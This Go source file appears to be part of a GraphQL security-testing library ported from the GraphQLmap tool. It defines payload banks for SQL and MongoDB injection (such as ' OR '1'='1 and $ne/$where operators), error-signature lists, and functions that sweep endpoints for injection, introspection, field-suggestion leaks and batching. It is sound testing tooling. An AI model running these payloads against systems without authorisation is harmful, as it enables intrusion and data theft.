package graphqlmap

// Injection sweeps and the payload banks behind them.
//
// The Python tool's SQL functions send exactly one sleep payload per dialect and leave the
// verdict to a human reading timestamps. The banks here keep that payload as the timing
// primitive and add the boolean and error-based forms the tool's own README demonstrates
// through GRAPHQL_CHARSET / $regex usage, so a sweep can reach a verdict without a delay.

import (
	"context"
	"fmt"
	"strings"
	"time"
)

// NoSQLPayloads are the MongoDB operator injections the tool's examples use ($regex, $ne, $gt
// appear in both the README and utils.cmdlist).
var NoSQLPayloads = []string{
	`{"$ne": null}`,
	`{"$ne": ""}`,
	`{"$gt": ""}`,
	`{"$regex": ".*"}`,
	`{"$regex": "^a"}`,
	`{"$where": "1==1"}`,
	`{"$exists": true}`,
	`true`,
	`null`,
}

// BooleanPairs are true/false condition pairs for a boolean-differential sweep. The pair
// matters: a true condition that leaves the response as the baseline had it, and a false one
// that changes it, is the only shape that distinguishes injection from input validation.
type BooleanPair struct {
	Dialect Dialect
	True    string
	False   string
}

func BooleanPairsFor(d Dialect) []BooleanPair {
	switch d {
	case PostgreSQL, MySQL, MSSQL:
		return []BooleanPair{
			{d, "1 AND 1=1", "1 AND 1=2"},
			{d, "' OR '1'='1", "' OR '1'='2"},
			{d, "1' AND '1'='1", "1' AND '1'='2"},
		}
	}
	return nil
}

// ErrorPayloads provoke a parser error without changing semantics.
var ErrorPayloads = []string{`'`, `"`, `\`, `')`, `"))`, `' OR 1=1--`}

// SQLErrorSignatures are the messages that prove a SQL parser saw the payload. Kept here so
// the library is self-contained; a caller with a richer bank can pass its own to SweepErrors.
var SQLErrorSignatures = []string{
	"You have an error in your SQL syntax",
	"Unclosed quotation mark",
	"quoted string not properly terminated",
	"unterminated quoted string",
	"unterminated quoted identifier",
	"syntax error at or near",
	"ORA-0", "ORA-1", "PLS-0",
	"SQLSTATE",
	"SQLException",
	"pg_query",
	"psql:",
	"MySqlException",
	"Npgsql",
	"SQLiteException",
	"Incorrect syntax near",
}

// NoSQLErrorSignatures are the MongoDB/driver messages that prove operator injection reached
// a document store.
var NoSQLErrorSignatures = []string{
	"MongoError",
	"MongoServerError",
	"BSONTypeError",
	"unknown operator",
	"$where",
	"E11000",
	"CastError",
	"failed to parse",
}

// FindingKind is what a sweep proved.
type FindingKind int

const (
	FindingNone FindingKind = iota
	FindingErrorSignature
	FindingBooleanDifferential
	FindingTiming
	FindingSuggestionLeak
	FindingBatchingAccepted
	FindingIntrospectionEnabled
	// FindingInconclusive means a probe could not be judged — a failed send or a baseline
	// too noisy. It is not a clean result.
	FindingInconclusive
)

func (k FindingKind) String() string {
	switch k {
	case FindingNone:
		return "no evidence"
	case FindingErrorSignature:
		return "error signature absent from baseline"
	case FindingBooleanDifferential:
		return "boolean differential"
	case FindingTiming:
		return "controllable time delay"
	case FindingSuggestionLeak:
		return "field suggestions leaked"
	case FindingBatchingAccepted:
		return "query batching accepted"
	case FindingIntrospectionEnabled:
		return "introspection enabled"
	case FindingInconclusive:
		return "inconclusive"
	}
	return "unknown"
}

// Confirms reports whether the kind supports a finding. Inconclusive does not, and neither
// does None, but they are different reports.
func (k FindingKind) Confirms() bool {
	switch k {
	case FindingErrorSignature, FindingBooleanDifferential, FindingTiming,
		FindingSuggestionLeak, FindingBatchingAccepted, FindingIntrospectionEnabled:
		return true
	}
	return false
}

// Finding is one confirmed observation.
type Finding struct {
	Kind    FindingKind
	Payload string
	Detail  string
	Dialect Dialect
}

// SweepReport is everything a sweep learned, including what it could not judge.
type SweepReport struct {
	Findings []Finding
	// Inconclusive counts probes whose comparison could not be made.
	Inconclusive int
	// Unsent counts probes that never reached the endpoint.
	Unsent   int
	Requests int
}

// Confirmed returns the findings that support a conclusion.
func (r *SweepReport) Confirmed() []Finding {
	var out []Finding
	for _, f := range r.Findings {
		if f.Kind.Confirms() {
			out = append(out, f)
		}
	}
	return out
}

// SweepErrors substitutes each error payload for TokenBlind and reports signatures the
// baseline did not already carry.
//
// The baseline check is not optional: an endpoint that always emits a SQL error proves
// nothing, and the pre-existing signature is reported as inconclusive rather than dropped.
func (c *Client) SweepErrors(ctx context.Context, query string, signatures []string) (*SweepReport, error) {
	if !strings.Contains(query, TokenBlind) {
		return nil, fmt.Errorf("graphqlmap: query contains no %s", TokenBlind)
	}
	if len(signatures) == 0 {
		signatures = append(append([]string{}, SQLErrorSignatures...), NoSQLErrorSignatures...)
	}
	base, err := c.baselineFor(ctx, query, TokenBlind, "1")
	if err != nil {
		return nil, fmt.Errorf("graphqlmap: no baseline: %w", err)
	}
	rep := &SweepReport{Requests: 1}
	baseText := strings.ToLower(string(base.Body))

	for _, payload := range ErrorPayloads {
		res, err := c.Execute(ctx, strings.ReplaceAll(query, TokenBlind, payload))
		rep.Requests++
		if err != nil {
			rep.Unsent++
			continue
		}
		text := strings.ToLower(string(res.Body))
		for _, sig := range signatures {
			needle := strings.ToLower(sig)
			if !strings.Contains(text, needle) {
				continue
			}
			if strings.Contains(baseText, needle) {
				rep.Inconclusive++
				rep.Findings = append(rep.Findings, Finding{
					Kind: FindingInconclusive, Payload: payload,
					Detail: fmt.Sprintf("signature %q was already in the baseline", sig)})
				continue
			}
			rep.Findings = append(rep.Findings, Finding{
				Kind: FindingErrorSignature, Payload: payload,
				Detail: fmt.Sprintf("introduced %q", sig)})
		}
	}
	return rep, nil
}

// SweepBoolean runs the true/false pairs for a dialect.
func (c *Client) SweepBoolean(ctx context.Context, query string, d Dialect) (*SweepReport, error) {
	if !strings.Contains(query, TokenBlind) {
		return nil, fmt.Errorf("graphqlmap: query contains no %s", TokenBlind)
	}
	base, err := c.baselineFor(ctx, query, TokenBlind, "1")
	if err != nil {
		return nil, fmt.Errorf("graphqlmap: no baseline: %w", err)
	}
	rep := &SweepReport{Requests: 1}
	baseLen := base.DataLen()

	for _, pair := range BooleanPairsFor(d) {
		whenTrue, errT := c.Execute(ctx, strings.ReplaceAll(query, TokenBlind, pair.True))
		whenFalse, errF := c.Execute(ctx, strings.ReplaceAll(query, TokenBlind, pair.False))
		rep.Requests += 2
		if errT != nil || errF != nil {
			rep.Unsent++
			continue
		}
		trueMatches := abs(whenTrue.DataLen()-baseLen) < c.lengthDelta
		falseMatches := abs(whenFalse.DataLen()-baseLen) < c.lengthDelta
		switch {
		case trueMatches && !falseMatches:
			rep.Findings = append(rep.Findings, Finding{
				Kind: FindingBooleanDifferential, Payload: pair.True + " / " + pair.False, Dialect: d,
				Detail: fmt.Sprintf("true kept the baseline shape (%d bytes), false changed it (%d)",
					whenTrue.DataLen(), whenFalse.DataLen())})
		case !trueMatches && !falseMatches:
			// Both moved: the payloads were rejected or sanitised, not interpreted.
			rep.Inconclusive++
			rep.Findings = append(rep.Findings, Finding{
				Kind: FindingInconclusive, Payload: pair.True + " / " + pair.False, Dialect: d,
				Detail: "both conditions changed the response; the input is being validated, not interpreted"})
		}
	}
	return rep, nil
}

func abs(n int) int {
	if n < 0 {
		return -n
	}
	return n
}

// SweepTiming runs the sleep payload for each dialect.
func (c *Client) SweepTiming(ctx context.Context, query string, dialects ...Dialect) (*SweepReport, error) {
	if len(dialects) == 0 {
		dialects = []Dialect{PostgreSQL, MySQL, MSSQL}
	}
	rep := &SweepReport{}
	for _, d := range dialects {
		t, err := c.TimingProbe(ctx, query, d)
		rep.Requests += 2
		if err != nil {
			rep.Unsent++
			continue
		}
		switch t.Verdict {
		case TimingDelayObserved:
			rep.Findings = append(rep.Findings, Finding{
				Kind: FindingTiming, Payload: t.Payload, Dialect: d,
				Detail: fmt.Sprintf("baseline %s, injected %s", t.Baseline, t.Injected)})
		case TimingInconclusive:
			rep.Inconclusive++
			rep.Findings = append(rep.Findings, Finding{
				Kind: FindingInconclusive, Payload: t.Payload, Dialect: d, Detail: t.Verdict.String()})
		}
	}
	return rep, nil
}

// AuditReport is the whole-endpoint posture sweep Audit produces.
type AuditReport struct {
	IntrospectionEnabled bool
	Schema               *Schema
	Suggestions          []string
	Batching             *BatchReport
	Findings             []Finding
	Inconclusive         int
	Requests             int
}

// Audit runs the endpoint-level checks that need no injection point: introspection, field
// suggestions, and batching. It is the posture half; the sweeps above are the injection half.
func (c *Client) Audit(ctx context.Context, batchSize int) (*AuditReport, error) {
	rep := &AuditReport{}

	if schema, err := c.Introspect(ctx); err == nil {
		rep.IntrospectionEnabled = true
		rep.Schema = schema
		rep.Findings = append(rep.Findings, Finding{
			Kind:   FindingIntrospectionEnabled,
			Detail: fmt.Sprintf("the %s introspection document was answered with %d types", schema.Document, len(schema.Types)),
		})
	}
	rep.Requests += 2

	// Suggestions leak schema even when introspection is off, which is why this runs
	// regardless of the result above.
	if res, err := c.Execute(ctx, SuggestionProbe("")); err == nil {
		rep.Requests++
		if s := FieldSuggestions(res.ErrorMessages()); len(s) > 0 {
			rep.Suggestions = s
			rep.Findings = append(rep.Findings, Finding{
				Kind:   FindingSuggestionLeak,
				Detail: "the endpoint suggests field names in its errors: " + strings.Join(s, ", ")})
		}
	}

	if batchSize > 1 {
		if b, err := c.Batch(ctx, MinimalIntrospection, batchSize); err == nil {
			rep.Requests++
			rep.Batching = b
			if b.Accepted {
				rep.Findings = append(rep.Findings, Finding{
					Kind:   FindingBatchingAccepted,
					Detail: fmt.Sprintf("%d queries in one request returned %d envelopes", b.Requested, b.Returned)})
			}
		}
	}
	return rep, nil
}

// DefaultTimingDelay is what the Python tool hardcodes (30s), kept as the documented default
// for callers that want the original behaviour rather than the library's shorter 10s.
const DefaultTimingDelay = 30 * time.Second
